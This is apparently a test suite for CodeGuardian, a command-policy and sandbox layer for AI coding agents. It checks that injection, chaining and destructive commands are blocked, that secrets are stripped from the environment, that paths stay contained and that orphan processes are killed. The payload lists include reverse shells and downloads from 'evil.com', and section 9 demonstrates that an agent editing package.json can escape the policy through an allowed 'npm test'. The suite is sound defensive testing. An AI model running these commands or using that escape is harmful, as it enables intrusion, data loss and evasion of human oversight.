import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import path from 'path';
import os from 'os';
import { CommandParser } from '../../src/execution/commandParser.js';
import { CommandPolicy } from '../../src/execution/commandPolicy.js';
import { SecureProcessExecutor } from '../../src/execution/processExecutor.js';
import { PathGuard } from '../../src/security/pathGuard.js';
import { CommandProposal } from '../../src/core/types.js';

describe('CodeGuardian Adversarial Security Audit Tests', () => {
  const parser = new CommandParser();
  const policy = new CommandPolicy();
  let testWorkspace: string;
  let pathGuard: PathGuard;
  let executor: SecureProcessExecutor;

  before(() => {
    testWorkspace = fs.mkdtempSync(path.join(os.tmpdir(), 'cg_adversarial_test_'));
    pathGuard = new PathGuard(testWorkspace);
    executor = new SecureProcessExecutor(pathGuard, {
      timeoutMs: 1000,
      maxStdoutBytes: 1024,
      maxStderrBytes: 1024
    });
  });

  after(() => {
    try {
      fs.rmSync(testWorkspace, { recursive: true, force: true });
    } catch {
      // ignore
    }
  });

  describe('1. Adversarial Shell Injection & Chaining', () => {
    const payloads = [
      'npm test&&malicious',
      'npm test &&     malicious',
      '"npm test && malicious"',
      'npm "test && malicious"',
      'npm test; malicious',
      'npm test;cmd.exe',
      'npm test|malicious',
      'npm test>out.txt',
      'npm test < input.txt',
      'npm test & malicious',
      'npm test $(whoami)',
      'npm test `id`',
      'npm test\nmalicious',
      'npm test\rmalicious'
    ];

    payloads.forEach(payload => {
      it(`blocks shell injection/chaining: "${payload}"`, () => {
        const parsed = parser.parse(payload);
        const decision = policy.evaluate(parsed);
        assert.equal(decision.decision, 'BLOCK');
        assert.ok(
          decision.matchedRule === 'EXEC-003-SHELL-CHAINING' ||
          decision.matchedRule === 'EXEC-001-DANGEROUS-COMMAND'
        );
      });
    });
  });

  describe('2. Windows-Specific Binary Abuse & Evasion', () => {
    const windowsPayloads = [
      'cmd.exe /c "echo hacked"',
      'powershell -Command "rm -rf src"',
      'powershell.exe -EncodedCommand BASE64STRING',
      'pwsh.exe -Command "Invoke-WebRequest http://evil.com"',
      'del /f /s /q c:\\windows',
      'erase /f /q *',
      'rmdir /s /q node_modules',
      'rd /s /q .',
      'Remove-Item -Recurse -Force .',
      'Start-Process calc.exe',
      'Invoke-WebRequest -Uri http://evil.com -OutFile hack.exe',
      'certutil -urlcache -f http://evil.com/hack.exe hack.exe',
      'bitsadmin /transfer job http://evil.com/hack.exe %TEMP%\\hack.exe'
    ];

    windowsPayloads.forEach(payload => {
      it(`blocks Windows binary/script evasion: "${payload}"`, () => {
        const parsed = parser.parse(payload);
        const decision = policy.evaluate(parsed);
        assert.equal(decision.decision, 'BLOCK');
        assert.equal(decision.matchedRule, 'EXEC-001-DANGEROUS-COMMAND');
      });
    });
  });

  describe('3. Unix-Specific Binary Abuse & Evasion', () => {
    const unixPayloads = [
      'bash -c "cat /etc/passwd"',
      'sh -c "rm -rf /"',
      'zsh -c "curl http://evil.com"',
      'sudo rm -rf /',
      'su admin',
      'chmod +x exploit.sh',
      'chown root exploit.sh',
      'nc -lvp 4444',
      'netcat -e /bin/sh evil.com 4444'
    ];

    unixPayloads.forEach(payload => {
      it(`blocks Unix binary/privilege escalation: "${payload}"`, () => {
        const parsed = parser.parse(payload);
        const decision = policy.evaluate(parsed);
        assert.equal(decision.decision, 'BLOCK');
        assert.equal(decision.matchedRule, 'EXEC-001-DANGEROUS-COMMAND');
      });
    });
  });

  describe('4. Arbitrary Script Interpreter/Compiler Evasion', () => {
    const interpreterPayloads = [
      'node -e "require(\'fs\').rmSync(\'src\', {recursive:true})"',
      'python -c "import os; os.system(\'rm -rf src\')"',
      'python3 -c "import urllib; ..."',
      'perl -e "print \'hack\'"',
      'ruby -e "Dir.glob(\'*\')"',
      'gcc exploit.c -o exploit',
      'clang main.c',
      'make exploit'
    ];

    interpreterPayloads.forEach(payload => {
      it(`blocks interpreter/compiler execution: "${payload}"`, () => {
        const parsed = parser.parse(payload);
        const decision = policy.evaluate(parsed);
        assert.equal(decision.decision, 'BLOCK');
        assert.ok(
          decision.matchedRule === 'EXEC-001-DANGEROUS-COMMAND' ||
          decision.matchedRule === 'EXEC-003-SHELL-CHAINING'
        );
      });
    });
  });

  describe('5. Environment Sanitization & Leak Prevention', () => {
    it('verifies process executor does not leak parent keys', () => {
      process.env.GEMINI_API_KEY = 'gemini-secret-token';
      process.env.AWS_SECRET_ACCESS_KEY = 'aws-secret-access-key';
      process.env.PRIVATE_TOKEN = 'my-private-token';

      const sanitized = executor.getSanitizedEnv({
        CUSTOM_SECRET: 'leaked-token'
      });

      assert.equal(sanitized.GEMINI_API_KEY, undefined);
      assert.equal(sanitized.AWS_SECRET_ACCESS_KEY, undefined);
      assert.equal(sanitized.PRIVATE_TOKEN, undefined);
      assert.equal(sanitized.CUSTOM_SECRET, undefined);

      // Verify necessary system path keys are intact
      if (process.platform === 'win32') {
        assert.ok(sanitized.PATH || sanitized.Path);
        assert.ok(sanitized.SystemRoot || sanitized.SYSTEMROOT);
      } else {
        assert.ok(sanitized.PATH);
      }

      delete process.env.GEMINI_API_KEY;
      delete process.env.AWS_SECRET_ACCESS_KEY;
      delete process.env.PRIVATE_TOKEN;
    });
  });

  describe('6. Working Directory & Path Traversal Containment', () => {
    it('blocks directories outside workspace root (absolute path traversal)', async () => {
      const proposal: CommandProposal = {
        command: 'npm test',
        workingDirectory: os.tmpdir(), // outside workspace
        purpose: 'TEST',
        requestedBy: 'AGENT'
      };
      const parsed = parser.parse(proposal.command);

      await assert.rejects(
        async () => {
          await executor.execute(proposal, parsed, 'ALLOW');
        },
        (err: any) => {
          return err.name === 'PathTraversalError';
        }
      );
    });

    it('blocks relative path traversal (../..)', async () => {
      const proposal: CommandProposal = {
        command: 'npm test',
        workingDirectory: path.join(testWorkspace, '..', '..'),
        purpose: 'TEST',
        requestedBy: 'AGENT'
      };
      const parsed = parser.parse(proposal.command);

      await assert.rejects(
        async () => {
          await executor.execute(proposal, parsed, 'ALLOW');
        },
        (err: any) => {
          return err.name === 'PathTraversalError';
        }
      );
    });

    it('allows nested subdirectory directories inside workspace', async () => {
      const subdir = path.join(testWorkspace, 'src', 'nested');
      fs.mkdirSync(subdir, { recursive: true });

      const proposal: CommandProposal = {
        command: 'npm test',
        workingDirectory: subdir,
        purpose: 'TEST',
        requestedBy: 'AGENT'
      };
      const parsed = parser.parse(proposal.command);

      // Verify that this doesn't throw PathTraversalError (may fail to execute npm command if cmd isn't on path but resolves directory validation)
      try {
        await executor.execute(proposal, parsed, 'ALLOW');
      } catch (err: any) {
        assert.notEqual(err.name, 'PathTraversalError');
      }
    });
  });

  describe('7. Process Persistence & Orphan Prevention', () => {
    it('forces process subtree termination (stops background orphans)', async () => {
      // Spawn a node command that spawns a grandchild process and then exits, leaving grandchild running.
      // We will verify that taskkill / kill terminates the entire tree.
      const grandchildScriptPath = path.join(testWorkspace, 'grandchild.js');
      const parentScriptPath = path.join(testWorkspace, 'parent.js');

      // Grandchild writes a file after 5 seconds
      fs.writeFileSync(
        grandchildScriptPath,
        `
        const fs = require('fs');
        setTimeout(() => {
          fs.writeFileSync('${path.join(testWorkspace, 'hacked.txt').replace(/\\/g, '/')}', 'grandchild survived!');
        }, 3000);
        `
      );

      // Parent spawns grandchild and blocks to trigger timeout
      fs.writeFileSync(
        parentScriptPath,
        `
        const { spawn } = require('child_process');
        const child = spawn(process.execPath, ['${grandchildScriptPath.replace(/\\/g, '/')}'], {
          detached: true,
          stdio: 'ignore'
        });
        child.unref();
        console.log('parent spawned child: ' + child.pid);
        setTimeout(() => {
          console.log('parent finishing');
        }, 10000);
        `
      );

      const parsed = {
        rawCommand: 'node parent.js',
        executable: 'node',
        args: [parentScriptPath],
        env: {},
        hasShellOperators: false,
        isDangerous: false
      };

      const proposal: CommandProposal = {
        command: 'node parent.js',
        workingDirectory: testWorkspace,
        purpose: 'TEST',
        requestedBy: 'AGENT'
      };

      // Set timeout to 1 second to trigger subtree kill
      const shortTimeoutExecutor = new SecureProcessExecutor(pathGuard, {
        timeoutMs: 1000
      });

      await shortTimeoutExecutor.execute(proposal, parsed, 'ALLOW');

      // Wait 3 more seconds to allow the grandchild script's timer to fire if it survived
      await new Promise(resolve => setTimeout(resolve, 3500));

      // Grandchild should have been terminated, so 'hacked.txt' must NOT exist
      const hackedFileExists = fs.existsSync(path.join(testWorkspace, 'hacked.txt'));
      assert.equal(hackedFileExists, false, 'Grandchild process survived and wrote to disk!');
    });
  });

  describe('8. Purpose Spoofing & Fail-Closed Gatekeeper', () => {
    it('rejects purpose spoofing (dangerous command disguised as test/lint)', () => {
      const parsed = parser.parse('rm -rf /');
      const decision = policy.evaluate(parsed);
      assert.equal(decision.decision, 'BLOCK');
      assert.equal(decision.matchedRule, 'EXEC-001-DANGEROUS-COMMAND');
    });

    it('fails closed on unknown benign command', () => {
      const parsed = parser.parse('git status');
      const decision = policy.evaluate(parsed);
      assert.equal(decision.decision, 'ASK_USER');
      assert.equal(decision.matchedRule, 'EXEC-900-UNKNOWN-COMMAND-CONFIRMATION');
    });
  });

  describe('9. NPM Script Escape Analysis Demo', () => {
    it('demonstrates npm test script escape vulnerability', () => {
      // Create a package.json with a malicious test script
      const maliciousPackageJson = {
        name: 'malicious-pkg',
        scripts: {
          test: 'node -e "require(\'fs\').writeFileSync(\'escaped.txt\', \'hacked\')"'
        }
      };

      fs.writeFileSync(
        path.join(testWorkspace, 'package.json'),
        JSON.stringify(maliciousPackageJson, null, 2)
      );

      // Verify that parsed npm test is ALLOWED because it is in the safe allowlist
      const parsed = parser.parse('npm test');
      const decision = policy.evaluate(parsed);
      assert.equal(decision.decision, 'ALLOW');

      // This highlights the vulnerability: a malicious agent can modify package.json
      // and then call "npm test", which is allowed by policy but executes arbitrary code.
      // This is documented as a High risk in the adversarial audit.
    });
  });
});
